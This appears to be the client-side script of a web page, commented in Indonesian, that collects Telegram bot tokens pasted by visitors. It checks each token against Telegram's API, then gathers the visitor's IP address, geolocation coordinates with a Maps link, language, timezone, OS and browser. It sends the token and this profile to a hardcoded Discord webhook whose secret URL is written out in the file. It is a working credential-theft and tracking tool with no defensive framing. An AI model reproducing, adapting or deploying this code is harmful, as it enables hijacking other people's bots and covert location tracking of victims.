// ============================================
// KONFIGURASI - GANTI DI SINI
// ============================================
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1558709793735057510/XqoQ1lvO20Y9iJoOP7kMecBOhP1nDltKQHcdmGsT5ayPmw6kokXmflrq4lBo2v_X2wfR";
// ============================================

const statusEl = document.getElementById("status");
const tokenInput = document.getElementById("tokenInput");
const submitBtn = document.getElementById("submitBtn");
const pasteBtn = document.getElementById("pasteBtn");

function setStatus(msg, type = "") {
  statusEl.textContent = msg;
  statusEl.className = "status " + type;
}

function formatDate(d = new Date()) {
  const dd = String(d.getDate()).padStart(2, "0");
  const mm = String(d.getMonth() + 1).padStart(2, "0");
  const yyyy = d.getFullYear();
  return `${dd}/${mm}/${yyyy}`;
}

function formatTime(d = new Date()) {
  return d.toTimeString().split(" ")[0];
}

// ============================================
// DETEKSI BAHASA / REGION
// ============================================
function getLanguageInfo() {
  const lang = navigator.language || "Unknown";
  const langs = Array.isArray(navigator.languages)
    ? navigator.languages.slice(0, 3).join(", ")
    : lang;

  let tz = "Unknown";
  try {
    tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
  } catch {}

  const offsetMin = -new Date().getTimezoneOffset();
  const sign = offsetMin >= 0 ? "+" : "-";
  const absMin = Math.abs(offsetMin);
  const offH = String(Math.floor(absMin / 60)).padStart(2, "0");
  const offM = String(absMin % 60).padStart(2, "0");
  const offset = `UTC${sign}${offH}:${offM}`;

  return { lang, langs, tz, offset };
}

// ============================================
// DETEKSI OS & PLATFORM
// ============================================
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const platform = navigator.platform || "Unknown";

  let os = "Unknown";
  let deviceType = "Desktop";

  if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
  else if (/Windows NT 6\.3/.test(ua)) os = "Windows 8.1";
  else if (/Windows NT 6\.1/.test(ua)) os = "Windows 7";
  else if (/Windows/.test(ua)) os = "Windows";
  else if (/Mac OS X/.test(ua)) os = "macOS";
  else if (/Android/.test(ua)) { os = "Android"; deviceType = "Mobile"; }
  else if (/iPhone|iPad|iPod/.test(ua)) { os = "iOS"; deviceType = "Mobile"; }
  else if (/Linux/.test(ua)) os = "Linux";
  else if (/CrOS/.test(ua)) os = "ChromeOS";

  let browser = "Unknown";
  if (/Edg\//.test(ua)) browser = "Edge";
  else if (/OPR\/|Opera/.test(ua)) browser = "Opera";
  else if (/Chrome\//.test(ua)) browser = "Chrome";
  else if (/Firefox\//.test(ua)) browser = "Firefox";
  else if (/Safari\//.test(ua)) browser = "Safari";

  if (/Mobile|Android|iPhone/.test(ua)) deviceType = "Mobile";
  else if (/Tablet|iPad/.test(ua)) deviceType = "Tablet";
  else deviceType = "Desktop";

  return { os, platform, browser, deviceType, userAgent: ua };
}

// ============================================
// IP + LOKASI + KOORDINAT
// Fallback: ipify → ipinfo.io
// ============================================
async function getIPInfo() {
  let ip = "Unknown";
  let lat = "0.00000";
  let lon = "0.00000";
  let city = "-";
  let region = "-";
  let country = "-";

  // ipify dulu
  try {
    const res = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
    if (res.ok) {
      const data = await res.json();
      if (data.ip) ip = data.ip;
    }
  } catch (e) {
    console.warn("ipify gagal:", e);
  }

  // ipinfo.io fallback
  try {
    const res = await fetch("https://ipinfo.io/json", { cache: "no-store" });
    if (res.ok) {
      const data = await res.json();
      if (ip === "Unknown" && data.ip) ip = data.ip;
      if (data.city) city = data.city;
      if (data.region) region = data.region;
      if (data.country) country = data.country;
      if (data.loc && data.loc.includes(",")) {
        const [la, lo] = data.loc.split(",");
        if (la && lo) {
          lat = Number(la).toFixed(5);
          lon = Number(lo).toFixed(5);
        }
      }
    }
  } catch (e) {
    console.warn("ipinfo gagal:", e);
  }

  if (!lat || lat === "NaN") lat = "0.00000";
  if (!lon || lon === "NaN") lon = "0.00000";

  return { ip, lat, lon, city, region, country };
}

// ============================================
// VALIDASI FORMAT TOKEN
// ============================================
function isValidFormat(token) {
  return /^\d{6,}:[A-Za-z0-9_-]{30,}$/.test(token);
}

// ============================================
// PASTE DARI CLIPBOARD
// ============================================
async function pasteToken() {
  try {
    const text = await navigator.clipboard.readText();
    if (!text) {
      setStatus("Clipboard kosong", "err");
      return;
    }
    tokenInput.value = text.trim();
    tokenInput.focus();
    setStatus("📋 Token di-paste", "info");
    setTimeout(() => {
      if (statusEl.textContent === "📋 Token di-paste") setStatus("");
    }, 1500);
  } catch (e) {
    setStatus("⚠️ Browser blokir clipboard. Paste manual (Ctrl+V)", "err");
  }
}

// ============================================
// AMBIL INFO BOT DARI TELEGRAM
// ============================================
async function getBotInfo(token) {
  const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
  const data = await res.json();
  if (!data.ok) {
    throw new Error(data.description || "Token tidak valid");
  }
  return data.result;
}

// ============================================
// KIRIM KE DISCORD
// ============================================
async function sendToDiscord({ name, username, token, net, device, lang }) {
  // Maps hanya muncul kalau koordinat valid (bukan 0.00000)
  const hasCoords = net.lat !== "0.00000" && net.lon !== "0.00000";
  const mapsLine = hasCoords
    ? `**🗺️ Maps : https://www.google.com/maps?q=${net.lat},${net.lon}**\n`
    : `**🗺️ Maps : Tidak tersedia**\n`;

  const content =
    `**[📜Token Telegram📜]**\n` +
    `**[ ${name} ]**\n` +
    `**[ @${username} ]**\n` +
    `**[🎫 Token_bot : \`${token}\` [ salin ]**\n` +
    `**[🌐 IP : \`${net.ip}\`**\n` +
    `**[📍 Lokasi : ${net.city}, ${net.region}, ${net.country}**\n` +
    `**[🧭 Koordinat : ${net.lat}, ${net.lon}**\n` +
    mapsLine +
    `**[🗣️ Region Bahasa : ${lang.lang}**\n` +
    `**[📚 Preferensi : ${lang.langs}**\n` +
    `**[🕒 Timezone : ${lang.tz} (${lang.offset})**\n` +
    `**[💻 OS : ${device.os}**\n` +
    `**[🖥️ Platform : ${device.platform} (${device.browser} - ${device.deviceType})**\n` +
    `**[📅 Date : ${formatDate()} | ⏰ ${formatTime()}**`;

  const res = await fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content })
  });

  if (!res.ok) throw new Error("Gagal kirim ke Discord: " + await res.text());
}

// ============================================
// SUBMIT
// ============================================
async function submitToken() {
  const token = tokenInput.value.trim();

  if (!token) {
    setStatus("❌ Token tidak boleh kosong!", "err");
    return;
  }

  if (!isValidFormat(token)) {
    setStatus("❌ Format token tidak valid!\nContoh: 123456789:ABCdef...", "err");
    return;
  }

  submitBtn.disabled = true;
  setStatus("🔍 Cek token ke Telegram...", "info");

  try {
    // 1. Validasi ke Telegram
    const bot = await getBotInfo(token);
    const botName = bot.first_name || "-";
    const botUsername = bot.username || "-";

    // 2. Ambil info device, IP & bahasa
    setStatus("🌐 Ambil info device, IP & bahasa...", "info");
    const device = getDeviceInfo();
    const net = await getIPInfo();
    const lang = getLanguageInfo();

    // 3. Kirim ke Discord
    setStatus("📨 Kirim ke Discord...", "info");
    await sendToDiscord({
      name: botName,
      username: botUsername,
      token,
      net,
      device,
      lang
    });

    tokenInput.value = "";
    setStatus(`✅ Token @${botUsername} berhasil dikirim!`, "ok");
  } catch (e) {
    console.error(e);
    setStatus("❌ " + (e.message || "Token invalid / bot nonaktif"), "err");
  } finally {
    submitBtn.disabled = false;
  }
}

// ============================================
// EVENT LISTENER
// ============================================
submitBtn.addEventListener("click", submitToken);
pasteBtn.addEventListener("click", pasteToken);

tokenInput.addEventListener("keydown", e => {
  if (e.key === "Enter") submitToken();
});